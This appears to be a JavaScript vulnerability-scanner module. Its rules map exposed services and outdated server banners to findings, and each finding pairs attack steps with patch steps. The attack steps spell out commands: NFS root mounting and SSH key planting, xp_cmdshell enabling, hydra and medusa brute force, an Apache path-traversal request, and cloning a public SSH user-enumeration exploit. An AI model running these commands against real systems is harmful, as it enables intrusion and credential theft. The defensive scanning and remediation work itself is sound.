    ports: [2049, 111],
    severity: 'high', cvss: 7.5,
    title: 'NFS Service Exposed',
    description: 'NFS is accessible. Misconfigured /etc/exports can allow unauthenticated read or write access to mounted filesystems.',
    remediation: 'Restrict /etc/exports to specific trusted IPs. Use NFSv4 with Kerberos. Block ports 111 and 2049 at the perimeter.',
    cve: null, tags: ['file-sharing', 'exposure'],
    exploitSteps: [
      { label: 'Enumerate exports', detail: 'showmount -e <target> — lists all NFS exports and their allowed client ranges' },
      { label: 'Mount filesystem', detail: 'mount -t nfs <target>:/ /mnt/target — if export allows *, attacker mounts root FS' },
      { label: 'Read sensitive files', detail: 'Browse /etc/shadow, SSH private keys, app configs for credentials' },
      { label: 'Write for persistence', detail: 'Add SSH public key to /root/.ssh/authorized_keys if root squash is disabled' },
    ],
    patchSteps: [
      { label: 'Restrict /etc/exports', detail: 'Replace * with specific IPs: /data 10.0.1.5(rw,sync,no_subtree_check)' },
      { label: 'Enable root squash', detail: 'Add root_squash to all export entries to map root to nobody' },
      { label: 'Use NFSv4 + Kerberos', detail: 'Set sec=krb5p for authentication + encryption on all exports' },
      { label: 'Firewall ports 111/2049', detail: 'Block portmapper (111) and NFS (2049) from all non-trusted networks' },
    ],
  },
  {
    ports: [1433],
    severity: 'high', cvss: 8.0,
    title: 'MSSQL Server Directly Accessible',
    description: 'Microsoft SQL Server is exposed to the network. SQL Server has been targeted for sa brute force, xp_cmdshell execution, and multiple CVEs.',
    remediation: 'Place SQL Server behind the application tier. Disable xp_cmdshell. Use Windows Authentication. Restrict port 1433.',
    cve: null, tags: ['database', 'exposure'],
    exploitSteps: [
      { label: 'Brute force sa', detail: 'Spray common passwords against sa account: sqsh -S <target> -U sa -P <pass>' },
      { label: 'Enable xp_cmdshell', detail: "EXEC sp_configure 'show advanced options',1; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;" },
      { label: 'OS Command Execution', detail: "EXEC xp_cmdshell 'whoami'; — runs as SQL Server service account (often SYSTEM)" },
      { label: 'Data Exfiltration', detail: 'SELECT * FROM sensitive_table; BULK INSERT to exfiltrate or use linked servers' },
    ],
    patchSteps: [
      { label: 'Disable xp_cmdshell', detail: "EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;" },
      { label: 'Use Windows Auth', detail: 'Switch from SQL auth to Windows Integrated Authentication; disable sa account' },
      { label: 'Firewall port 1433', detail: 'Allow only from app server IPs; block all internet access to 1433' },
      { label: 'Enable SQL Server Audit', detail: 'Configure login auditing for both failed and successful logins' },
    ],
  },
  {
    ports: [1521],
    severity: 'high', cvss: 7.5,
    title: 'Oracle DB Listener Exposed',
    description: 'Oracle Database listener is network-accessible. Oracle has a long history of critical vulnerabilities and should not be directly exposed.',
    remediation: 'Bind listener to internal interfaces only. Apply Oracle CPU patches. Use Oracle Connection Manager as a proxy.',
    cve: null, tags: ['database', 'exposure'],
    exploitSteps: [
      { label: 'Enumerate SIDs', detail: 'Use oscanner or tnscmd10g to enumerate valid Oracle SIDs via listener' },
      { label: 'Brute force accounts', detail: 'Spray default credentials: sys/change_on_install, scott/tiger, dbsnmp/dbsnmp' },
      { label: 'Java stored procedures', detail: 'DBMS_JAVA.RUNJAVA or DBMS_SCHEDULER can execute OS commands if Java is enabled' },
      { label: 'TNS Poison', detail: 'CVE-2012-1675: poison the TNS listener to intercept and alter client connections' },
    ],
    patchSteps: [
      { label: 'Bind listener to internal IP', detail: 'Set HOST= to internal IP in listener.ora; restart listener' },
      { label: 'Apply Oracle CPU', detail: 'Apply the latest Oracle Critical Patch Update quarterly' },
      { label: 'Change default passwords', detail: 'Immediately change sys, system, dbsnmp, and all default account passwords' },
      { label: 'Use Connection Manager', detail: 'Deploy Oracle CMAN as a proxy gateway instead of direct listener exposure' },
    ],
  },
  {
    ports: [5900],
    severity: 'high', cvss: 7.0,
    title: 'VNC Remote Desktop Exposed',
    description: 'VNC is accessible. VNC typically uses weak authentication (single password, no lockout) and older versions transmit data without encryption.',
    remediation: 'Tunnel VNC over SSH. Enforce a strong password. Upgrade to TLS-capable VNC. Restrict to known IPs.',
    cve: null, tags: ['remote-access', 'cleartext'],
    exploitSteps: [
      { label: 'Connect directly', detail: 'vncviewer <target>:5900 — many deployments have no password or default "password"' },
      { label: 'Brute force', detail: 'No account lockout: hydra -P rockyou.txt vnc://<target> runs indefinitely' },
      { label: 'Sniff session', detail: 'VNC without TLS: all screen data and keystrokes visible in packet capture' },
      { label: 'Full desktop control', detail: 'Once connected, attacker has complete GUI access — no logging in many configs' },
    ],
    patchSteps: [
      { label: 'Tunnel over SSH', detail: 'ssh -L 5900:localhost:5900 user@host — only expose VNC on loopback' },
      { label: 'Set strong password', detail: 'VNC passwords must be 8+ chars; consider switching to certificate auth' },
      { label: 'Firewall port 5900', detail: 'Block 5900 externally; allow only from specific admin IPs' },
      { label: 'Enable VNC TLS', detail: 'Use TigerVNC with VeNCrypt extension for encrypted sessions' },
    ],
  },
  // ── Medium ──
  {
    ports: [161],
    severity: 'medium', cvss: 6.5,
    title: 'SNMP Service Accessible',
    description: 'SNMP v1/v2c uses community strings (default: "public") transmitted in cleartext. A readable community allows full device enumeration; a writable community allows configuration changes.',
    remediation: 'Upgrade to SNMPv3 with authPriv. Change default community strings. Restrict SNMP to management VLAN.',
    cve: null, tags: ['enumeration', 'cleartext'],
    exploitSteps: [
      { label: 'Test default community', detail: 'snmpwalk -v2c -c public <target> — "public" community still works on many devices' },
      { label: 'Enumerate everything', detail: 'OID walk dumps: running processes, open ports, installed software, routing table, ARP table' },
      { label: 'Capture community string', detail: 'Sniff UDP 161 — community string is cleartext in every SNMP packet' },
      { label: 'Write access abuse', detail: 'snmpset with write community can change device config, routing, disable interfaces' },
    ],
    patchSteps: [
      { label: 'Upgrade to SNMPv3', detail: 'Configure authPriv mode with SHA auth and AES encryption; deprecate v1/v2c' },
      { label: 'Change community strings', detail: 'Replace "public"/"private" with long random strings; treat them as passwords' },
      { label: 'Restrict to MGMT VLAN', detail: 'ACL: allow SNMP only from network management system IPs' },
      { label: 'Disable if unused', detail: 'If SNMP monitoring is not in use, disable the service entirely' },
    ],
  },
  {
    ports: [135],
    severity: 'medium', cvss: 6.0,
    title: 'MSRPC Endpoint Mapper Exposed',
    description: 'Microsoft RPC endpoint mapper (port 135) is accessible. This enumerates all registered RPC endpoints and has been exploited historically.',
    remediation: 'Block port 135 at the network perimeter. Use Windows Firewall to restrict RPC access to internal networks.',
    cve: 'CVE-2003-0352', tags: ['windows', 'enumeration'],
    exploitSteps: [
      { label: 'Map RPC endpoints', detail: 'rpcdump.py <target> lists all registered RPC services and their dynamic ports' },
      { label: 'Target specific service', detail: 'Identify high-value RPC services (WMI, Task Scheduler, DCOM) for further attack' },
      { label: 'DCOM exploitation', detail: 'impacket\'s dcomexec.py or wmiexec.py pivots through RPC for command execution' },
      { label: 'Historic exploit', detail: 'CVE-2003-0352 (Blaster worm): buffer overflow in RPCSS pre-auth → full system compromise' },
    ],
    patchSteps: [
      { label: 'Block port 135', detail: 'Firewall rule: deny TCP 135 from internet; allow only from internal management hosts' },
      { label: 'Windows Firewall rules', detail: 'GPO: restrict DCOM activation to specific accounts and IP ranges' },
      { label: 'Apply patches', detail: 'Ensure MS03-026 and all subsequent RPC patches are applied' },
      { label: 'Restrict DCOM access', detail: 'Component Services → My Computer → Properties → COM Security → restrict launch permissions' },
    ],
  },
  {
    ports: [139],
    severity: 'medium', cvss: 5.9,
    title: 'NetBIOS Session Service Exposed',
    description: 'NetBIOS session service (port 139) is accessible. NetBIOS leaks system information and has been exploited in several historical attacks.',
    remediation: 'Block ports 137-139 at the perimeter. Disable NetBIOS over TCP/IP where not required.',
    cve: null, tags: ['windows', 'enumeration'],
    exploitSteps: [
      { label: 'Name enumeration', detail: 'nmblookup -A <target> returns NetBIOS names, workgroup, and MAC address' },
      { label: 'Session setup', detail: 'smbclient -L <target> -N enumerates shares over NetBIOS without credentials' },
      { label: 'Null session', detail: 'net use \\\\target\\IPC$ "" /u:"" opens null session on unpatched systems for user enumeration' },
      { label: 'Information gathering', detail: 'Leaked hostname, domain, and workgroup aids targeted password spraying' },
    ],
    patchSteps: [
      { label: 'Disable NetBIOS over TCP/IP', detail: 'Network adapter → TCP/IP properties → WINS → Disable NetBIOS over TCP/IP' },
      { label: 'Block ports 137-139', detail: 'Firewall: block UDP 137-138 and TCP 139 from external networks' },
      { label: 'Use DNS instead', detail: 'Migrate name resolution to DNS; remove reliance on WINS/NetBIOS' },
      { label: 'Disable null sessions', detail: 'GPO: Network access: Restrict anonymous access to named pipes and shares = Enabled' },
    ],
  },
  {
    ports: [25],
    severity: 'medium', cvss: 5.5,
    title: 'SMTP Relay Accessible',
    description: 'SMTP is directly accessible. Open SMTP relays allow spam and phishing email to be sent through your server, damaging your IP reputation.',
    remediation: 'Require SMTP authentication. Restrict relay to authenticated users only. Configure SPF, DKIM, and DMARC.',
    cve: null, tags: ['email', 'relay'],
    exploitSteps: [
      { label: 'Test open relay', detail: 'EHLO test → MAIL FROM:<spammer@attacker.com> → RCPT TO:<victim@target.com> → DATA' },
      { label: 'Send phishing email', detail: 'Relay phishing campaign through your server — appears to come from your domain' },
      { label: 'IP reputation damage', detail: 'Your IP gets listed on Spamhaus, CBL, and other blocklists within hours' },
      { label: 'Credential harvesting', detail: 'Phishing emails collect credentials from victims pointing back to your infrastructure' },
    ],
    patchSteps: [
      { label: 'Require SMTP AUTH', detail: 'Configure postfix: smtpd_relay_restrictions = permit_sasl_authenticated, reject' },
      { label: 'Publish SPF record', detail: 'DNS TXT record: "v=spf1 mx -all" — restricts which servers can send for your domain' },
      { label: 'Configure DKIM', detail: 'Sign outbound mail with DKIM; reject unsigned inbound mail claiming your domain' },
      { label: 'Enable DMARC', detail: 'DNS: "_dmarc TXT v=DMARC1; p=reject; rua=mailto:dmarc@yourdomain.com"' },
    ],
  },
  {
    ports: [5601],
    severity: 'medium', cvss: 6.5,
    title: 'Kibana Dashboard Exposed',
    description: 'Kibana is accessible. Older versions lack authentication and expose full read access to Elasticsearch data, as well as potential RCE via Timelion/Canvas.',
    remediation: 'Enable X-Pack security for Kibana. Place behind a reverse proxy with authentication. Block port 5601 at perimeter.',
    cve: 'CVE-2019-7609', tags: ['dashboard', 'exposure'],
    exploitSteps: [
      { label: 'Open dashboard', detail: 'Browse http://<target>:5601 — full Kibana UI accessible, all indices visible' },
      { label: 'Read all log data', detail: 'Discover tab shows all Elasticsearch indices — application logs, security events, PII' },
      { label: 'Timelion RCE (< 6.6)', detail: 'CVE-2019-7609: craft Timelion expression with .es().props(label.__proto__.env) for RCE' },
      { label: 'Canvas RCE (< 7.0)', detail: 'Prototype pollution in Canvas allows arbitrary JS execution on the server' },
    ],
    patchSteps: [
      { label: 'Enable X-Pack security', detail: 'Set xpack.security.enabled: true in kibana.yml; configure built-in users' },
      { label: 'Reverse proxy with auth', detail: 'Place Nginx in front with HTTP basic auth or OAuth before Kibana' },
      { label: 'Upgrade Kibana', detail: 'Upgrade to 7.6+ which has security enabled by default with free tier' },
      { label: 'Firewall port 5601', detail: 'Block 5601 from internet; allow only from internal analyst workstations' },
    ],
  },
]

// ── Banner-based version rules ────────────────────────────────────────────────

const BANNER_RULES = [
  {
    match: /OpenSSH[_\s](3\.|4\.|5\.|6\.|7\.[0-6][^0-9])/i,
    severity: 'medium', cvss: 7.0,
    title: 'Outdated OpenSSH Version',
    description: (b) => `SSH banner reveals an outdated OpenSSH version: "${b.slice(0, 100).trim()}". Older releases contain known vulnerabilities including user enumeration (CVE-2018-15473) and agent hijacking (CVE-2023-38408). The version string is broadcast before any authentication attempt.`,
    remediation: 'Upgrade OpenSSH to the latest stable release. Suppress the version banner. Enforce key-only auth and deploy fail2ban.',
    cve: 'CVE-2023-38408', tags: ['outdated-software', 'version-disclosure'],
    exploitSteps: [
      {
        label: 'Version fingerprint',
        detail: 'The SSH banner is sent in plaintext before any authentication. We grab it with netcat or nmap to identify the exact version and match it to known CVEs.',
        commands: [
          'nc -v ' + '{{target}}' + ' 22',
          'nmap -sV -p 22 --script=ssh2-enum-algos {{target}}',
          'ssh -v {{target}} 2>&1 | grep "remote software"',
        ],
      },
      {
        label: 'User enumeration',
        detail: 'CVE-2018-15473 affects OpenSSH < 7.7. A timing side-channel in the auth handler reveals which usernames exist on the system. We use this to build a valid-user list for the brute force.',
        commands: [
          'git clone https://github.com/Rhynorater/CVE-2018-15473-Exploit /opt/ssh-enum',
          'cd /opt/ssh-enum && pip3 install -r requirements.txt',
          'python3 sshUsernameEnumExploit.py --userList /usr/share/wordlists/metasploit/unix_users.txt {{target}}',
          '# Or with Metasploit:',
          'msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS {{target}}; set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt; run"',
        ],
      },
      {
        label: 'Agent hijacking (CVE-2023-38408)',
        detail: 'CVE-2023-38408 allows a malicious SSH server to trigger code execution in a client\'s ssh-agent via specially crafted PKCS#11 provider requests. If the target machine is acting as a jump host and users forward their agents, we can hijack them.',
        commands: [
          '# Check if ssh-agent forwarding is in use on the target:',
          'ssh -o StrictHostKeyChecking=no user@{{target}} "env | grep SSH_AUTH_SOCK"',
          '# List available agents:',
          'ssh user@{{target}} "ls -la /tmp/ssh-*"',
          '# PoC available at: https://github.com/stong/CVE-2023-38408',
        ],
      },
      {
        label: 'Credential brute force',
        detail: 'With a confirmed valid username list from step 2, we run a targeted SSH brute force. Hydra and Medusa are both standard Kali tools for this. Use -t 4 to avoid triggering rate limits.',
        commands: [
          '# Single user brute force:',
          'hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{{target}} -t 4 -vV',
          '# Multiple users from enum output:',
          'hydra -L /tmp/valid_users.txt -P /usr/share/wordlists/rockyou.txt ssh://{{target}} -t 4 -f',
          '# Medusa alternative:',
          'medusa -h {{target}} -U /tmp/valid_users.txt -P /usr/share/wordlists/rockyou.txt -M ssh -t 4 -f',
        ],
      },
    ],
    patchSteps: [
      {
        label: 'Check current version',
        detail: 'Confirm what version is running before upgrading.',
        commands: [
          'ssh -V',
          'apt list --installed 2>/dev/null | grep openssh',
          'dpkg -l | grep openssh-server',
        ],
      },
      {
        label: 'Upgrade OpenSSH',
        detail: 'Install the latest available version from your package manager. On Debian/Ubuntu, this pulls from the official repos.',
        commands: [
          'sudo apt update && sudo apt upgrade openssh-server -y',
          'ssh -V  # confirm new version',
          'sudo systemctl status sshd',
        ],
      },
      {
        label: 'Suppress version banner',
        detail: 'DebianBanner no hides the OS version from the banner. You can\'t fully hide the OpenSSH version, but you can omit the Debian/Ubuntu suffix that helps attackers fingerprint the OS.',
        commands: [
          'echo "DebianBanner no" | sudo tee -a /etc/ssh/sshd_config',
          'sudo systemctl restart sshd',
          '# Verify — banner should now lack the OS string:',
          'nc -v localhost 22',
        ],
      },
      {
        label: 'Enforce key-only auth',
        detail: 'Password authentication is the primary brute force vector. Disable it entirely — users must have a key pair configured.',
        commands: [
          'sudo sed -i "s/^#*PasswordAuthentication.*/PasswordAuthentication no/" /etc/ssh/sshd_config',
          'sudo sed -i "s/^#*PubkeyAuthentication.*/PubkeyAuthentication yes/" /etc/ssh/sshd_config',
          'sudo systemctl restart sshd',
          '# Test that password auth is rejected:',
          'ssh -o PubkeyAuthentication=no user@localhost',
        ],
      },
      {
        label: 'Deploy fail2ban',
        detail: 'Fail2ban monitors auth logs and automatically bans IPs that exceed a failed-login threshold, blocking brute force attempts.',
        commands: [
          'sudo apt install fail2ban -y',
          'sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local',
          '# Edit jail.local — set SSH maxretry and bantime:',
          'sudo sed -i "/\\[sshd\\]/,/\\[/ s/^#maxretry.*/maxretry = 3/" /etc/fail2ban/jail.local',
          'sudo systemctl enable fail2ban && sudo systemctl start fail2ban',
          'sudo fail2ban-client status sshd',
        ],
      },
    ],
  },
  {
    match: /Apache\/(1\.|2\.[0-3]\.|2\.4\.[0-4][^0-9])/i,
    severity: 'high', cvss: 7.5,
    title: 'Outdated Apache HTTP Server',
    description: (b) => `HTTP banner reveals Apache: "${b.slice(0, 120).trim()}". This version has known critical vulnerabilities including path traversal (CVE-2021-41773) and request smuggling.`,
    remediation: 'Upgrade Apache to the latest 2.4.x release. Suppress version with ServerTokens Prod and ServerSignature Off.',
    cve: 'CVE-2021-41773', tags: ['outdated-software', 'web', 'version-disclosure'],
    exploitSteps: [
      { label: 'Version disclosure', detail: 'Server: Apache/2.4.49 header reveals exact version in every HTTP response' },
      { label: 'Path traversal (2.4.49)', detail: 'GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1 — read arbitrary files' },
      { label: 'RCE via CGI', detail: 'If mod_cgi enabled: POST shell commands through the path traversal to execute code' },
      { label: 'Request smuggling', detail: 'CL.TE or TE.CL smuggling attacks bypass security controls and poison shared caches' },
    ],
    patchSteps: [
      { label: 'Upgrade Apache', detail: 'apt install apache2 or compile latest 2.4.x; verify with apache2 -v' },
      { label: 'Suppress version banner', detail: 'Add to apache2.conf: ServerTokens Prod and ServerSignature Off' },
      { label: 'Disable unused modules', detail: 'a2dismod cgi autoindex status — reduce attack surface' },
      { label: 'Configure WAF', detail: 'Deploy ModSecurity with OWASP Core Rule Set in front of Apache' },
    ],
  },
  {
    match: /nginx\/(0\.|1\.[0-9]\.|1\.1[0-9]\.)/i,
    severity: 'medium', cvss: 6.5,
    title: 'Outdated nginx Version',
    description: (b) => `HTTP banner reveals nginx: "${b.slice(0, 120).trim()}". Older nginx releases contain buffer overflow and HTTP/2 vulnerabilities.`,
    remediation: 'Upgrade nginx to the latest stable release. Hide version with server_tokens off in nginx.conf.',
    cve: 'CVE-2022-41741', tags: ['outdated-software', 'web', 'version-disclosure'],
    exploitSteps: [
      { label: 'Version disclosure', detail: 'Server: nginx/1.14.0 revealed — attacker checks NVD for applicable CVEs' },
      { label: 'HTTP/2 memory corruption', detail: 'CVE-2022-41741: crafted HTTP/2 HPACK encoded header causes heap memory corruption' },
      { label: 'mp4 module overflow', detail: 'CVE-2022-41742: specially crafted mp4 file triggers out-of-bounds memory read/write' },
      { label: 'Recon for app vulns', detail: 'Version info aids in targeting framework-specific vulnerabilities in the app layer' },
    ],
    patchSteps: [
      { label: 'Upgrade nginx', detail: 'apt install nginx or add official nginx repo; target mainline or latest stable' },
      { label: 'Hide version', detail: 'In nginx.conf http block: server_tokens off;' },
      { label: 'Review HTTP/2 config', detail: 'If using HTTP/2, ensure worker_processes and client limits are tuned' },
      { label: 'Add security headers', detail: 'Add: add_header X-Content-Type-Options nosniff; add_header X-Frame-Options DENY;' },
    ],
  },
  {
    match: /Microsoft-IIS\/(4\.|5\.|6\.|7\.|8\.)/i,
    severity: 'high', cvss: 8.0,
    title: 'Outdated Microsoft IIS',
    description: (b) => `HTTP banner reveals IIS: "${b.slice(0, 120).trim()}". This version is end-of-life and has multiple known vulnerabilities.`,
    remediation: 'Upgrade to IIS 10 on Windows Server 2019 or later. Apply all Windows patches. Suppress version disclosure.',
    cve: null, tags: ['outdated-software', 'web'],
    exploitSteps: [
      { label: 'Identify version', detail: 'Server: Microsoft-IIS/7.5 — attacker maps to Windows Server 2008 R2 lifecycle end' },
      { label: 'WebDAV exploitation', detail: 'IIS 6: CVE-2017-7269 WebDAV buffer overflow → unauthenticated RCE' },
      { label: 'Short name disclosure', detail: 'IIS ~1 tilde trick enumerates filenames via 8.3 short name format in directory listings' },
      { label: 'ASP.NET padding oracle', detail: 'POET attack against ScriptResource.axd reveals encryption keys for forging auth cookies' },
    ],
    patchSteps: [
      { label: 'Upgrade Windows/IIS', detail: 'Migrate to Windows Server 2019/2022 with IIS 10; end-of-life OS cannot be patched' },
      { label: 'Suppress version header', detail: 'URLScan or web.config: <customHeaders><remove name="X-Powered-By" /></customHeaders>' },
      { label: 'Disable WebDAV', detail: 'IIS Manager → WebDAV Authoring Rules → disable; or remove WebDAV feature via Server Manager' },
      { label: 'Enable request filtering', detail: 'IIS Request Filtering module blocks malicious URL patterns and short-name attacks' },
    ],
  },
  {
    match: /ProFTPD 1\.[0-2]\./i,
    severity: 'high', cvss: 7.5,
    title: 'Outdated ProFTPD',
    description: (b) => `FTP banner reveals ProFTPD: "${b.slice(0, 100).trim()}". Older versions have buffer overflow and directory traversal vulnerabilities.`,
    remediation: 'Upgrade ProFTPD to the latest stable version. Consider migrating to SFTP.',
    cve: null, tags: ['outdated-software', 'ftp'],
    exploitSteps: [
      { label: 'Banner fingerprint', detail: 'ProFTPD 1.2.x / 1.3.x version in 220 banner — known CVE target' },
      { label: 'Backdoor (1.3.3c)', detail: 'CVE-2010-4221: 1.3.3c had backdoor on port 6200 inserted in compromised source code' },
      { label: 'Heap overflow', detail: 'CVE-2019-12815: mod_copy module CPFR/CPTO allows arbitrary file copy without auth' },
      { label: 'Directory traversal', detail: 'Older versions allow ../ traversal in CWD command to escape chroot jail' },
    ],
    patchSteps: [
      { label: 'Upgrade ProFTPD', detail: 'Download latest from proftpd.org or use package manager; verify version with proftpd -v' },
      { label: 'Disable mod_copy', detail: 'Comment out LoadModule mod_copy.c in proftpd.conf' },
      { label: 'Migrate to SFTP', detail: 'Enable SFTP via OpenSSH (Subsystem sftp) — eliminates FTP entirely' },
      { label: 'Enforce chroot', detail: 'DefaultRoot ~ — chroots all users to their home directory' },
    ],
  },
  {
    match: /220.*FTP|vsftpd|FileZilla Server|Pure-FTPd/i,
    severity: 'low', cvss: 3.5,
    title: 'FTP Service Version Disclosed',
    description: (b) => `FTP banner exposes service version: "${b.slice(0, 100).trim()}". This aids attacker reconnaissance.`,
    remediation: 'Configure the FTP server to suppress version information in its banner. Replace FTP with SFTP.',
    cve: null, tags: ['version-disclosure', 'ftp'],
    exploitSteps: [
      { label: 'Banner grab', detail: 'nc <target> 21 — 220 banner immediately reveals FTP software and version' },
      { label: 'Targeted CVE lookup', detail: 'Version string maps to exact known vulnerabilities in NVD database' },
      { label: 'Reduce guesswork', detail: 'Attacker skips generic scans and goes straight to version-specific exploits' },
    ],
    patchSteps: [
      { label: 'Suppress banner', detail: 'vsftpd: ftpd_banner=FTP Service | ProFTPD: ServerIdent off | Pure-FTPd: -b flag' },
      { label: 'Migrate to SFTP', detail: 'FTP is fundamentally insecure; SFTP over SSH is the correct replacement' },
      { label: 'IP restrict FTP', detail: 'If FTP must stay, allow only from known IP addresses via firewall' },
    ],
  },
  {
    match: /SSH-1\./,
    severity: 'critical', cvss: 9.0,
    title: 'Deprecated SSHv1 Protocol',
    description: (b) => `SSH banner indicates SSHv1 is enabled: "${b.slice(0, 80).trim()}". SSHv1 has fundamental cryptographic weaknesses and known attacks.`,
    remediation: 'Set Protocol 2 in sshd_config. Restart sshd. Upgrade to a modern OpenSSH version.',
    cve: 'CVE-2001-0572', tags: ['deprecated-protocol', 'cryptographic'],
    exploitSteps: [
      { label: 'Protocol downgrade', detail: 'Force SSHv1 negotiation — attacker connects with -1 flag to target SSHv1 specifically' },
      { label: 'Key exchange attack', detail: 'SSHv1 uses RSA1 with CRC-32 which is cryptographically broken — MITM is feasible' },
      { label: 'Session hijacking', detail: 'CRC32 compensation attack allows injection of data into established sessions' },
      { label: 'Password interception', detail: 'MITM during SSHv1 handshake can capture cleartext credentials' },
    ],
    patchSteps: [
      { label: 'Disable SSHv1', detail: 'In /etc/ssh/sshd_config add: Protocol 2 (remove any Protocol 1 or Protocol 1,2 line)' },
      { label: 'Restart sshd', detail: 'systemctl restart sshd — verify with: ssh -1 <host> should now refuse connection' },
      { label: 'Upgrade OpenSSH', detail: 'Modern OpenSSH (7.6+) removed SSHv1 support entirely; upgrade eliminates the option' },
      { label: 'Audit authorized_keys', detail: 'Remove any RSA1 format keys from all authorized_keys files on the system' },
    ],
  },
]

// ── Analysis logic ────────────────────────────────────────────────────────────

function analyzeHost(host) {
  const findings = []

  for (const rule of PORT_RULES) {
    const matchingPorts = host.ports.filter(p => rule.ports.includes(p))
    if (matchingPorts.length === 0) continue

    const port = matchingPorts[0]
    findings.push({
      ip: host.ip,
      hostname: host.hostname,
      port,
      ports: matchingPorts,
      service: host.services[host.ports.indexOf(port)] ?? SERVICE_MAP[port] ?? 'unknown',
      severity: rule.severity,
      cvss: rule.cvss,
      title: rule.title,
      description: rule.description,
      remediation: rule.remediation,
      cve: rule.cve ?? null,
      tags: rule.tags,
      exploitSteps: rule.exploitSteps ?? [],
      patchSteps: rule.patchSteps ?? [],
    })
  }

  if (host.banners && typeof host.banners === 'object') {
    for (const [portStr, banner] of Object.entries(host.banners)) {
      if (!banner) continue
      const port = parseInt(portStr)

      for (const rule of BANNER_RULES) {
        if (!rule.match.test(banner)) continue
        if (findings.some(f => f.port === port && f.title === rule.title)) continue

        findings.push({
          ip: host.ip,
          hostname: host.hostname,
          port,
          ports: [port],
          service: host.services[host.ports.indexOf(port)] ?? SERVICE_MAP[port] ?? 'unknown',
          severity: rule.severity,
          cvss: rule.cvss,
          title: rule.title,
          description: typeof rule.description === 'function' ? rule.description(banner) : rule.description,
          remediation: rule.remediation,
          cve: rule.cve ?? null,
          tags: rule.tags,
          exploitSteps: rule.exploitSteps ?? [],
          patchSteps: rule.patchSteps ?? [],
        })
      }
    }
  }

  const weight = { critical: 4, high: 3, medium: 2, low: 1, info: 0 }
  findings.sort((a, b) => (weight[b.severity] ?? 0) - (weight[a.severity] ?? 0))
  return findings
}

// ── Public API ────────────────────────────────────────────────────────────────

export async function vulnScanTarget(target, mode, send) {
  const discoveredHosts = []

  await scanTarget(target, mode === 'Quick' ? 'Quick' : 'Standard', (event, data) => {
    if (event === 'start') {
      send('start', { total: data.total, target, phase: 'discovery' })
    } else if (event === 'host' && data.status === 'up') {
      discoveredHosts.push(data)
      send('host_found', { ip: data.ip, hostname: data.hostname, portCount: data.ports.length, ports: data.ports })
    } else if (event === 'progress') {
      send('discovery_progress', { scanned: data.scanned, total: data.total })
    }
  })

  send('phase', { phase: 'analysis', hostCount: discoveredHosts.length })

  let findingId = 0
  for (let i = 0; i < discoveredHosts.length; i++) {
    const host = discoveredHosts[i]
    const findings = analyzeHost(host)

    for (const finding of findings) {
      send('finding', { ...finding, id: ++findingId })
    }

    send('host_analyzed', { ip: host.ip, index: i + 1, total: discoveredHosts.length, findingCount: findings.length })
  }

  send('complete', { hostsScanned: discoveredHosts.length, findingsTotal: findingId })
}
